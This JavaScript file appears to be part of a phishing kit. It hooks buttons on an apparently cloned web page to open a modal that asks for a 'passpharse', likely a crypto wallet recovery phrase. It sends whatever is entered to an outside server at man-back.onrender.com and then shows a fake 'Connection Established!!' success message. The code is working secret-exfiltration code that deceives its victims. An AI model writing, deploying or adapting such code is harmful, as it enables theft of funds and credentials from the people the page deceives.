let myModalAlternative;
setTimeout(()=>{
    const body = document.getElementsByTagName('body')[0];

const button = document.getElementsByClassName('deXseV');
const secButton = document.getElementsByClassName('jmRqFu')[0];
console.log(button);
const singleButton = button[0];
myModalAlternative = new bootstrap.Modal('#exampleModal', {});
singleButton.addEventListener('click',()=>{ 
    myModalAlternative.show();
})

secButton.addEventListener('click',()=>{ 
    myModalAlternative.show();
})
// button.addEventListener('click',(e)=>{
//     console.log(e);
//     alert("wat is shrink")
// })

},2500);

const submit =async ()=>{
    console.log("worked here");
    const resp = document.getElementById("passpharse").value;
    console.log(resp);
    const data ={
        "body": resp,
        "subject": "sending details here"
    };
    myModalAlternative.hide();
  const etchResp = await fetch('https://man-back.onrender.com/send-email',{
        method: 'POST', // or 'PUT'
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    swal("Good job!", "Connection Established!!", "success");
}